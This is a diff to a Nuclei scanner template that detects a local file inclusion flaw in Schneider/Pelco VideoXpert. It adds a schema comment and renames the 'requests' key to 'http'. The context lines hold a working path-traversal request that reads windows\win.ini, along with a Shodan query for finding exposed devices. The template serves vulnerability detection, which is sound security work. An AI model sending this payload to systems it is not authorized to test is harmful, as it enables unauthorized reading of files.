@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: videoxpert-lfi
 
 info:
@@ -16,7 +17,7 @@ info:
     shodan-query: title:"VideoXpert"
   tags: schneider,pelco,packetstorm,lfi,videoxpert
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/portal//..\\\..\\\..\\\..\\\windows\win.ini'
